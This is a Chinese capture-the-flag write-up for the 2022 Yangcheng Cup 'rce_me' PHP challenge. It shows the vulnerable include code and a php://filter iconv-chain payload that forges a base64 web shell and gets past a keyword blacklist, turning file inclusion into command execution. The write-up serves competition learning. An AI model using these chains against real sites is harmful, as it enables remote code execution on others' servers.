---
title: 2022 年羊城杯网络安全大赛 Writeup
contest: 2022 羊城杯
year: 2022
difficulty: hard
vuln_type: [lfi, rce, web_unknown]
tags: [hxp-CTF, includer's-revenge, base64, iconv-chain, php-filter, UTF-8, UTF-16, CSISO2022KR, UCS2, file-include, getflag]
attack_chain: ["题目: ?file=php://filter/...&0=command", "黑名单过滤 < ? $ [ ] ; eval > @ _ create install pear", "绕过 '4' 字符（其转换链带 _）→ 用 '8' 替代", "base64 编码 payload: <?=`$_GET[0]`;;/* → PD89YCRfR0VUWzBdYDs7Lyo", "iconv 链: convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2", "避免 4 (含 _), 用 R/B/C/8/9/f/s/z/U/P/V/0/Y/W 等字符的 iconv 链生成 PHP 标签", "用 php://filter 的 base64-decode + 多次 iconv 还原 base64", "include 触发命令执行"]
key_payload: "PD89YCRfR0VUWzBdYDs7Lyo (base64 of '<?=`$_GET[0]`;;/*')"
one_liner: 2022 羊城杯 rce_me：php://filter + base64 + iconv 链 + hxp includer's revenge
lesson: php://filter 链是高级 LFI；iconv 链字符集转换是 CTF 经典；黑名单绕过要找对应字符
quality: high
---

# 2022 羊城杯网络安全大赛 Writeup

原文 https://www.ctfiot.com/54929.html

## Web: rce_me
```php
<?php
(empty($_GET["file"])) ? highlight_file(__FILE__) : $file = $_GET["file"];
function fliter($var): bool {
    $blacklist = ["<", "?", "$", "[", "]", ";", "eval", ">", "@", "_", "create", "install", "pear"];
    foreach ($blacklist as $blackword) {
        if (stristr($var, $blackword)) return False;
    }
    return True;
}
if (fliter($_SERVER["QUERY_STRING"])) {
    include $file;
} else {
    die("Noooo0");
}
```

**思路：hxp CTF 2021 The End of LFI?**

**关键问题：**
- 题目未忽略报错
- 黑名单过滤了 `_` → 攻击 payload 不能含 `_`
- 字符 `4` 的 iconv 链含 `_` → 不能用 `4` 还原 `?`
- 用 `8` 的链 `convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2` 替代

**base64 payload：**
```
<?=`$_GET[0]`;;/*
↓
PD89YCRfR0VUWzBdYDs7Lyo
```

**完整 iconv 链（每个字符一条链）：**
```python
conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': '...|convert.iconv.851.BIG5',
    '0': '...|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
}
```

**完整 payload：**
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode/resource=php://filter/.../PD89YCRfR0VUWzBdYDs7Lyo
```

## 教学价值
- **php://filter 链** 是高级 LFI
- **iconv 链字符集转换** 是 CTF 经典
- **base64-decode + iconv** 双层嵌套
- **hxp includer's revenge** 是 hxp CTF 2021 经典
- **PHP 弱类型 + 黑名单** 绕过思路

## 工具
- Burp
- php://filter 在线工具
- iconv 字符集大全
- Python 写链构造

## 关联
- hxp CTF 2021 The End of LFI
- 类似 0CTF/EKO 高级 web
- 羊城杯是华南区 CTF
